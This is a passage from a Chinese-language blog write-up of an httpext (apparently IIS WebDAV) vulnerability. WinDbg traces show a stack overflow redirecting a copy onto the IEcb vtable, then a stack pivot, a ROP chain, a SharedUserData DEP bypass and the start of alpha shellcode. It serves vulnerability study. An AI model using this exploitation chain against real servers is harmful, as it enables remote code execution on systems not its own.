httpext!HrCheckIfHeader+0xbc:
671253e2&nbsp;ffd7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;edi&nbsp;{msvcrt!wcslen&nbsp;(77bd8ef2)}
0:009&gt;&nbsp;dc&nbsp;60d32a
0060d32a&nbsp;&nbsp;00740068&nbsp;00700074&nbsp;002f003a&nbsp;006c002f&nbsp;&nbsp;h.t.t.p.:././.l.
0060d33a&nbsp;&nbsp;0063006f&nbsp;006c0061&nbsp;006f0068&nbsp;00740073&nbsp;&nbsp;o.c.a.l.h.o.s.t.
0060d34a&nbsp;&nbsp;0062002f&nbsp;00620062&nbsp;00620062&nbsp;00620062&nbsp;&nbsp;/.b.b.b.b.b.b.b.
0:009&gt;&nbsp;p
eax=0000030d</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">第二次获得http://localhost/bbbbb...的长度，这个长度有0x30d，非常长，但是对应保存的位置变了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=00fff800&nbsp;ebx=0060b508&nbsp;ecx=00fff800&nbsp;edx=000002fe&nbsp;esi=00000000&nbsp;edi=77bd8ef2
eip=67125436&nbsp;esp=00fff7c0&nbsp;ebp=00fffc34&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!HrCheckIfHeader+0x110:
67125436&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;eax
0:009&gt;&nbsp;p
eax=00fff800&nbsp;ebx=0060b508&nbsp;ecx=00fff800&nbsp;edx=000002fe&nbsp;esi=00000000&nbsp;edi=77bd8ef2
eip=67125437&nbsp;esp=00fff7bc&nbsp;ebp=00fffc34&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;po&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000202
httpext!HrCheckIfHeader+0x111:
67125437&nbsp;ffb5d8fcffff&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebp-328h]&nbsp;ss:0023:00fff90c=680312c0
0:009&gt;&nbsp;dc&nbsp;ebp-328
00fff90c&nbsp;&nbsp;680312c0&nbsp;52566c44&nbsp;6c6d4b37&nbsp;585a4f58&nbsp;&nbsp;...hDlVR7KmlXOZX
00fff91c&nbsp;&nbsp;496a7950&nbsp;4a52584f&nbsp;664d4150&nbsp;680313c0&nbsp;&nbsp;PyjIOXRJPAMf...h
00fff92c&nbsp;&nbsp;65314834&nbsp;6e666f43&nbsp;436c7441&nbsp;680313c0&nbsp;&nbsp;4H1eCofnAtlC...h
00fff93c&nbsp;&nbsp;6a415343&nbsp;33307052&nbsp;424c5866&nbsp;6346704b&nbsp;&nbsp;CSAjRp03fXLBKpFc
0:009&gt;&nbsp;dd&nbsp;680312c0／／要用到的堆地址，这个地址会在最后用到
680312c0&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
680312d0&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000
680312e0&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;00000000&nbsp;00000000</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">可以看到，第二次利用的时候，会把ebp-328这个地方的值推入栈中，这个地方应该是stack buffer的地址，应该是个栈地址，但是现在变成了堆地址，就是由于第一次栈溢出，覆盖了这个变量。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">而这个值，会作为参数传入ScStorageFromUrl函数，作为memcpy拷贝的值。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这也就解释了为什么我们在上面分析漏洞的时候，会是向堆地址拷贝，而这一次拷贝，就不需要控制长度了，因为这个地方的值已经是堆地址，再怎么覆盖，也不会覆盖到cookie。这里未来要覆盖IEcb虚表结构。从而达到漏洞利用。这样，第二次向堆地址拷贝之后，这个堆地址会覆盖到IEcb的虚表，这个虚表结构会在最后利用时引用到。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在PoC中，有一处，这个会触发漏洞利用，是在CheckIfHeader之后到达位置，在CheckIfHeader的PszToken函数判断没有&lt;&gt;的http url之后，break掉，之后进入lock token处理。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=67140d15&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=0060e7b0&nbsp;esi=00fffc28&nbsp;edi=00000104
eip=67126c80&nbsp;esp=00fff940&nbsp;ebp=00fff950&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000206
httpext!ScStoragePathFromUrl+0x5:
67126c80&nbsp;e803100000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;httpext!_EH_prolog&nbsp;(67127c88)
0:009&gt;&nbsp;kb
ChildEBP&nbsp;RetAddr&nbsp;&nbsp;Args&nbsp;to&nbsp;Child&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
00fff93c&nbsp;67119469&nbsp;00fffab4&nbsp;00fff9a4&nbsp;00000000&nbsp;httpext!ScStoragePathFromUrl+0x5
00fff950&nbsp;67125740&nbsp;0060e7b0&nbsp;00fffab4&nbsp;00fff9a4&nbsp;httpext!CMethUtil::ScStoragePathFromUrl+0x18
00fffbd0&nbsp;664d4150&nbsp;680313c0&nbsp;65314834&nbsp;6e666f43&nbsp;httpext!CParseLockTokenHeader::HrGetLockIdForPath
+0x119
WARNING:&nbsp;Frame&nbsp;IP&nbsp;not&nbsp;in&nbsp;any&nbsp;known&nbsp;module.&nbsp;Following&nbsp;frames&nbsp;may&nbsp;be&nbsp;wrong.
00fffc3c&nbsp;6711f68e&nbsp;0060b508&nbsp;0060584e&nbsp;80000000&nbsp;0x664d4150
00fffc78&nbsp;6711f7c5&nbsp;0060c010&nbsp;00fffcd4&nbsp;671404e2&nbsp;httpext!CPropFindRequest::Execute+0x125</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这时候对应的IEcb已经被覆盖，这样，在进入ScStoragePathFromUrl函数之后，会进入我们在漏洞分析部分提到的CheckPrefixUrl函数，这个函数中有大量的IEcb虚表虚函数引用。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=680313c0&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=0060e7b0&nbsp;edi=680313c0
eip=671335f3&nbsp;esp=00fff4b4&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
httpext!ScStripAndCheckHttpPrefix+0x1e:
671335f3&nbsp;ff5024&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[eax+24h]&nbsp;&nbsp;ds:0023:680313e4=68016082
0:009&gt;&nbsp;dc&nbsp;eax
680313c0&nbsp;&nbsp;680313c0&nbsp;68006e4f&nbsp;68006e4f&nbsp;766a4247&nbsp;&nbsp;...hOn.hOn.hGBjv
680313d0&nbsp;&nbsp;680313c0&nbsp;4f744257&nbsp;52345947&nbsp;4b424b66&nbsp;&nbsp;...hWBtOGY4RfKBK</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">和大家分享了这个精妙利用，一般可能都会觉得是第二次url bbbbb的这个memcpy覆盖了关键函数导致的溢出、利用，实际上，在第一次url aaaaaa中，就已经引发了栈溢出，覆盖到了stackbuffer申请的指向栈buffer的指针，这个指针存放在栈里，用于后续调用存放虚拟路径，由于第一次栈溢出，覆盖到了这个变量导致第二次url bbbbb拷贝的时候，是向一个堆地址拷贝，这个堆地址后面的偏移中，存放着IEcb的vftable，通过覆盖虚表虚函数，在最后locktoken触发的ScStoragePathFromUrl中利用虚函数达到代码执行。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">而这个过程，也是巧妙的绕过了GS的检查。</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">简析ROP及shellcode</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这个漏洞使用了一些非常有意思的手法，一个是TK教主在13年安全会议上提到的shareduserdata，在ROP中，另一个是alpha shellcode。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，在前面虚函数执行之后，会先进行stack pivot，随后进入rop。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;t//stack&nbsp;pivot!!!
eax=680313c0&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=0060e7b0&nbsp;edi=680313c0
eip=68016082&nbsp;esp=00fff4b0&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!_alloca_probe+0x42:
68016082&nbsp;8be1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp,ecx
0:009&gt;&nbsp;p
eax=680313c0&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=0060e7b0&nbsp;edi=680313c0
eip=68016084&nbsp;esp=680313c0&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!_alloca_probe+0x44:
68016084&nbsp;8b08&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,dword&nbsp;ptr&nbsp;[eax]&nbsp;&nbsp;ds:0023:680313c0=680313c0
0:009&gt;&nbsp;p
eax=680313c0&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=0060e7b0&nbsp;edi=680313c0
eip=68016086&nbsp;esp=680313c0&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!_alloca_probe+0x46:
68016086&nbsp;8b4004&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,dword&nbsp;ptr&nbsp;[eax+4]&nbsp;ds:0023:680313c4=68006e4f
0:009&gt;&nbsp;p
eax=68006e4f&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=0060e7b0&nbsp;edi=680313c0
eip=68016089&nbsp;esp=680313c0&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!_alloca_probe+0x49:
68016089&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;eax
0:009&gt;&nbsp;p//ROP&nbsp;Chain
eax=68006e4f&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=0060e7b0&nbsp;edi=680313c0
eip=6801608a&nbsp;esp=680313bc&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!_alloca_probe+0x4a:
6801608a&nbsp;c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret
0:009&gt;&nbsp;p
eax=68006e4f&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=0060e7b0&nbsp;edi=680313c0
eip=68006e4f&nbsp;esp=680313c0&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!CPEncrypt+0x3b:
68006e4f&nbsp;5e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi
0:009&gt;&nbsp;p
eax=68006e4f&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=680313c0&nbsp;edi=680313c0
eip=68006e50&nbsp;esp=680313c4&nbsp;ebp=00fff4d0&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!CPEncrypt+0x3c:
68006e50&nbsp;5d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebp
0:009&gt;&nbsp;p
eax=68006e4f&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=680313c0&nbsp;edi=680313c0
eip=68006e51&nbsp;esp=680313c8&nbsp;ebp=68006e4f&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!CPEncrypt+0x3d:
68006e51&nbsp;c22000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;20h
0:009&gt;&nbsp;p
eax=68006e4f&nbsp;ebx=00fffbe8&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=680313c0&nbsp;edi=680313c0
eip=68006e4f&nbsp;esp=680313ec&nbsp;ebp=68006e4f&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!CPEncrypt+0x3b:
68006e4f&nbsp;5e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esi</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">经过一系列ROP之后，会进入KiFastSystemCall，这是利用SharedUserData bypass DEP的一环。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:009&gt;&nbsp;p
eax=0000008f&nbsp;ebx=7ffe0300&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=68031460&nbsp;edi=680124e3
eip=680124e3&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!HmacCheck+0x2c3:
680124e3&nbsp;ff23&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ebx]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ds:0023:7ffe0300={ntdll!KiFastSystemCall&nbsp;(7c8285e8)}
0:009&gt;&nbsp;p
eax=0000008f&nbsp;ebx=7ffe0300&nbsp;ecx=680313c0&nbsp;edx=00fff4f8&nbsp;esi=68031460&nbsp;edi=680124e3
eip=7c8285e8&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
ntdll!KiFastSystemCall:
7c8285e8&nbsp;8bd4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,esp
0:009&gt;&nbsp;p
eax=0000008f&nbsp;ebx=7ffe0300&nbsp;ecx=680313c0&nbsp;edx=68031400&nbsp;esi=68031460&nbsp;edi=680124e3
eip=7c8285ea&nbsp;esp=68031400&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
ntdll!KiFastSystemCall+0x2:
7c8285ea&nbsp;0f34&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sysenter
0:009&gt;&nbsp;p
eax=00000000&nbsp;ebx=7ffe0300&nbsp;ecx=00000001&nbsp;edx=ffffffff&nbsp;esi=68031460&nbsp;edi=680124e3
eip=68031460&nbsp;esp=68031404&nbsp;ebp=6e6f3176&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;zr&nbsp;na&nbsp;pe&nbsp;nc
cs=001b&nbsp;&nbsp;ss=0023&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=003b&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00000246
rsaenh!g_pfnFree+0x1a4:
68031460&nbsp;56&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;esi
0:009&gt;&nbsp;dc&nbsp;68031460
68031460&nbsp;&nbsp;00560056&nbsp;00410059&nbsp;00340034&nbsp;00340034&nbsp;&nbsp;V.V.Y.A.4.4.4.4.
68031470&nbsp;&nbsp;00340034&nbsp;00340034&nbsp;00340034&nbsp;00410051&nbsp;&nbsp;4.4.4.4.4.4.Q.A.</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">之后进入alpha shellcode，这时候68031460作为shareduserdata，已经具备可执行权限。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">Failed&nbsp;to&nbsp;map&nbsp;Heaps&nbsp;(error&nbsp;80004005)
Usage:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Image
Allocation&nbsp;Base:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;68000000
Base&nbsp;Address:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;68031000
End&nbsp;Address:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;68032000
Region&nbsp;Size:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00001000
Type:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;01000000&nbsp;&nbsp;&nbsp;&nbsp;MEM_IMAGE
State:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;00001000&nbsp;&nbsp;&nbsp;&nbsp;MEM_COMMIT
